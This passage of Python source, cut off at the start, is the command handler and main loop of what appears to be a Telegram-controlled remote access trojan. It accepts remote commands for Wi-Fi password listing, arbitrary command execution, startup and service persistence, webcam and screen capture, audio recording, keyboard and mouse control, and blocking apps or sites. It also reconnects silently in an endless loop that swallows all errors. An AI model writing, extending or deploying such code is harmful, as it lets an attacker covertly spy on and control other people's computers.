                            bot_client.send_message(chat_id, 'Failed to log out of session')
                elif command == 'pwd': 
                    send_command_result(os.getcwd())
                elif command == 'cd': 
                    send_command_result('cd path  -  Change current directory')
                elif command == 'ls': 
                    send_command_result(decode_shell_output('ls -al'.split()), file='ls.txt')
                elif command == 'hide': 
                    send_command_result('hide path  -  Hide folder or file at this path')
                elif command == 'unhide': 
                    send_command_result('unhide path  -  Unhide folder or file at this path')
                elif command == 'mkdir': 
                    send_command_result('mkdir path  -  Create folder at this path')
                elif command == 'mkfile': 
                    send_command_result('mkfile path -c content  -  Create file at this path')
                elif command == 'rn': 
                    send_command_result('rn path -t new name  -  Rename folder or file at this path')
                elif command == 'rmdir': 
                    send_command_result('rmdir path  -  Delete folder at this path')
                elif command == 'rm': 
                    send_command_result('rm path  -  Delete file at this path')
                elif command == 'cp': 
                    send_command_result('cp path from -t path to  -  Copy folder or file to this path')
                elif command == 'mv': 
                    send_command_result('mv path from -t path to  -  Move folder or file to this path')
                elif command == 'download': 
                    send_command_result('download path  -  Download file from this path')
                elif command == 'upload': 
                    send_command_result('To upload file\nYou need to upload using Telegram\nThe uploaded file is saved in this downloads folder')
                elif command == 'encrypt': 
                    send_command_result('encrypt path -p password  -  Encrypt file at this path')
                elif command == 'decrypt': 
                    send_command_result('decrypt path -p password  -  Decrypt file at this path')
                elif command == 'network': 
                    send_command_result(
'''
network -s  -  List detected Wi-Fi\n
network -p  -  List password Wi-Fi\n
network -c  -  Enable Internet\n
network -d  -  Disable Internet
'''.strip()
                    )
                elif command == 'ipconfig': 
                    send_command_result(systeminfo(ipconfig=True), file='ipconfig.txt')
                elif command == 'route': 
                    send_command_result(decode_shell_output('sudo ip route'.split()), file='route.txt')
                elif command == 'arp': 
                    send_command_result(arp(), file='arp.txt')
                elif command == 'netstat': 
                    send_command_result(netstat(), file='netstat.txt')
                elif command == 'site':
                    send_command_result(
'''
site -s url  -  Open website\n
site -b website name  -  Block website\n
site -d website name  -  Unblock website\n
site -l  -  Get list of blocked websites\n
site -r  -  Unblock all websites
'''.strip()
                    )
                elif command == 'systeminfo': 
                    send_command_result(systeminfo(), file='systeminfo.txt')
                elif command == 'buffer': 
                    send_command_result(
'''
buffer -g  -  Get data from buffer\n
buffer -c data  -  Copy data to buffer\n
buffer -r  -  Clear buffer
'''.strip()
                    )
                elif command == 'services': 
                    send_command_result(get_services(), file='services.txt')
                elif command == 'tasks': 
                    send_command_result(get_task(), file='tasks.txt')
                elif command == 'startup': 
                    send_command_result(get_startup(), file='startup.txt')
                elif command == 'paths': 
                    send_command_result(get_path(), file='paths.txt')
                elif command == 'app': 
                    send_command_result(
'''
app -g  -  Get name of the installed ones applications\n
app -s (-u = current user|-r = root user) file path  -  Run file at this path\n
app -s (-u = current user|-r = root user) file path --args arguments  -  Run file at this path with arguments\n
app -u url -n name  -  Download file from Internet\n
app (-u = current user|-r = root user) -a name -p file path  -  Add file to startup\n
app (-u = current user|-r = root user) -a name -p file path --args arguments  -  Add file to startup with arguments\n
app -a name  -  Delete file from startup\n
app -l -e  -  Get list of startup apps\n
app -r -e  -  Clear startup\n
app -t service name -p file path -d service description  -  Create service\n
app -t service name  -  Delete service\n
app -t -e service name  -  Enable service\n
app -t -d service name  -  Disable service\n
app -b app name  -  Block app\n
app -d app name  -  Unblock app\n
app -l -b  -  Get list of blocked apps\n
app -r -b  -  Unblock all apps
'''.strip()
                    )
                elif command == 'ps': 
                    send_command_result(get_ps(), file='ps.txt')
                elif command == 'kill': 
                    send_command_result('kill -p pid  -  Kill process by pid\n\nkill -n name  -  Kill process by name')
                elif command == 'cmd': 
                    send_command_result('''
cmd -e command  -  Execute command in cmd without output\n
cmd -g command  -  Execute command in cmd with output\n
cmd -h -g  -  Get cmd history\n
cmd -h -r  -  Clear cmd history
'''.strip()
                    )
                elif command == 'time': 
                    send_command_result('time -g  -  Get current time\n\ntime -c new time  -  Change current time')
                elif command == 'date': 
                    send_command_result('date -g  -  Get current date\n\ndate -c new date  -  Change current date')
                elif command == 'reboot': 
                    sp.run('sudo reboot'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL)
                    os.abort()
                elif command == 'shutdown': 
                    sp.run('sudo poweroff'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL)
                    os.abort()
                elif command == 'screenshot': 
                    send_command_result(take_screenshot(), file='screenshot.png')
                elif command == 'screenshot_webcam': 
                    send_command_result(take_screenshot_webcam(), file='screenshot_webcam.png')
                elif command == 'play': 
                    send_command_result(
'''
play -a file path  -  Play audio file\n
play -a -s second  -  Start recording audio and get recorded audio\n
play -v -s second  -  Start recording video from screen and get recorded video from screen\n
play -w -s second  -  Start recording video from webcam and get recorded video from webcam
'''.strip()
                    )
                elif command == 'mouse': 
                    send_command_result(
'''
mouse -g  -  Get current mouse cursor position\n
mouse -x coordinate -y coordinate -i interval  -  Mouse cursor movement\n
mouse -c click -i interval -l  -  Сlick left mouse button\n
mouse -c click -i interval -r  -  Сlick right mouse button\n
mouse -s how much scrolling  -  Mouse scrolling
'''.strip() 
                    )
                elif command == 'keyboard': 
                    send_command_result(
'''
keyboard -t text -i interval  -  Enter text on keyboard\n
keyboard -k key -p press -i interval  -  Press key on keyboard\n
keyboard -h hotkey  -  Press hotkey on keyboard\n
keyboard -d key -s second  -  Hold down key on keyboard\n
keyboard -c -k key -t new key  -  Remap key on keyboard\n
keyboard -c -h hotkey -t new hotkey  -  Remap hotkey on keyboard\n
keyboard -b key  -  Block key on keyboard\n
keyboard -r  -  Restoring keyboard settings
'''.strip()
                    )
                elif command == 'show': 
                    send_command_result(
'''
show -p title -t text  -  Show push message\n
show -i title -t text  -  Show information message\n
show -w title -t text  -  Show warning message\n
show -e title -t text  -  Show error message
'''.strip()
                    )
                else:
                    send_command_result(f'Command not found --> {command}')
        except BaseException as error: 
            bot_client.send_message(chat_id, 
                f'Why: An error occurred while processing this command\n({command})\nType: {type(error).__name__}\nDescription: {error}')

    
    bot_client.polling(none_stop=True)
    

def main():
    try:
        init()
    except ValueError:
        raise ValueError('Invalid token')
    except SystemError:
        raise SystemError("DON'T SUPPORT OS")
    except: ...

    try:
        start_modules()
    except: ...

    try:
        execute_startup()
    except: ...

    while True:
        try:
            try:
                bot(TeleBot(TOKEN))
            except: 
                sleep(10)
        except: 
            continue


main()